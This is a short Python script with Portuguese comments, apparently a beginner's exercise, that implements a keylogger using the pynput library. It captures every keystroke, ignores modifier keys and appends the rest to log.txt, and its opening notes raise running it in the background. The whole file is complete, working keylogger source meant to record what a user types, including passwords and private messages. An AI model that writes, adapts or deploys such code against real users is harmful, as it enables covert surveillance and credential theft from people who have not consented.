#1 - Vai ficar em execucao ou em segundo plano?
#2 - Toda vez que o usuario digitar uma tecla, o programa vai capturar essa tecla
#3 - O que for digitado, será gravado em um arquivo .txt
#4 - O arquivo ira mostrar tudo o que foi digitado, de formasequencial.

#1. Chama biblioteca para monitorar teclado
from pynput import keyboard

# Lista de teclas que sera ignorada pelo KEYLLOGGER
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

# A funcao e chamada sempre que uma tecla é precionada
def on_press(key):
    try:
        # Se for tecla normal(letra, numero, simbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        # Captura teclas que nao sao identificadas pelo CHAR
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                # Grava teclas como F1, F2 ....
                f.write(f"[{key}]")
# Inicia a captura do teclado
with keyboard.Listener(on_press=on_press) as listener:
    # Permite que scrip rode ate que haja interrupcao manual
    listener.join()